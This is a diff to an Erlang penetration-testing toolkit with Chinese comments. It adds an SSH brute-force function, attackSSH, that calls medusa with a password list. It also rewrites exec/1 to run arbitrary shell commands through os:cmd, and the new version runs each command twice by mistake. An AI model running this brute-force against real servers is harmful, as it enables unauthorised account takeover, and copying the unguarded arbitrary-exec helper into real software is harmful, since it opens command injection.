@@ -78,6 +78,7 @@
 -export([jsanal/1]).            %% JS 文件收集与分析
 -export([scanSubdomain/1]).     %% 子域名收集
 -export([exec/1]).              %% 执行系统命令，返回命令输出
+-export([attackSSH/2]).         %% SSH 暴力破解
 %%
 -export([start/0]).             %% 检查依赖并启动
 -export([scan/0]).              %% 启动监控脚本
@@ -245,6 +246,12 @@ scanSSH(Url) ->
     SshAuditResult = os:cmd(SshAuditCmd),
     io:put_chars(SshAuditResult).
 
+attackSSH(IP, USER) ->
+    % 连接 SSH 服务器
+    SSHCommand = "medusa -h " ++ IP ++ " -u " ++ USER ++ " -P ./passwords.txt -M ssh -t 10",
+    SSHResult = os:cmd(SSHCommand),
+    io:put_chars(SSHResult).
+
 %% ------------------------------------------------------------------
 %% jsanal/1
 %% 功能：调用 katana 工具对目标网站进行 JS 文件收集与分析，辅助 XSS/敏感信息挖掘
@@ -277,12 +284,38 @@ scanSubdomain(Url) ->
 
 %% ------------------------------------------------------------------
 %% exec/1
-%% 功能：执行任意系统命令，并返回命令输出（慎用！仅限受信任环境）
+%% 功能：执行任意系统命令，并返回命令输出（要小心使用哦！仅限在信任的环境下）
 %% 参数：
 %%   - Args：要执行的命令字符串
 %% 步骤：
 %%   1. 直接调用 os:cmd 执行命令
 %%   2. 返回命令执行结果
 %% ------------------------------------------------------------------
+exec(Args) when is_list(Args) ->
+    try
+        StrippedArgs = string:strip(Args),
+        os:cmd(StrippedArgs),
+        case StrippedArgs of
+            "" ->
+                io:format("\e[33m[提示] 哎呀！不能执行空命令哦～请输入一个有效的命令啦，亲！~n\e[0m"),
+                {error, empty_command};
+            Cmd ->
+                % 在调用 os:cmd 之前，让我们再次确认一下 Cmd 的内容哦～
+                io:format("DEBUG: 即将使用 Cmd = ~p 调用 os:cmd~n", [Cmd]),
+                io:format("DEBUG: Cmd 是一个列表吗？ ~p~n", [is_list(Cmd)]),
+                io:format("DEBUG: Cmd 是一个可打印的列表吗？ ~p~n", [io_lib:printable_list(Cmd)]),
+                Result = os:cmd(Cmd),
+                io:format("\e[32m[执行结果]~n~s\e[0m", [Result]),
+                Result
+        end
+    catch
+        error:badarg = Reason -> % 特别捕获 badarg 错误
+            io:format("\e[31m[错误] 哦豁！命令执行失败了，错误是 'badarg'。这通常意味着命令本身不是一个规范的字符串哦。命令是：~p，原因是：~p~n\e[0m", [Args, Reason]),
+            {error, Reason};
+        _:Reason ->
+            io:format("\e[31m[错误] 啊哦，命令没能成功运行呢：~p~n\e[0m", [Reason]),
+            {error, Reason}
+    end;
 exec(Args) ->
-    os:cmd(Args).
+    io:format("\e[31m[错误] 哈喽！命令需要是一个字符串（也就是一个字符列表）哦，但是我收到的是这个：~p~n\e[0m", [Args]),
+    {error, badarg}.
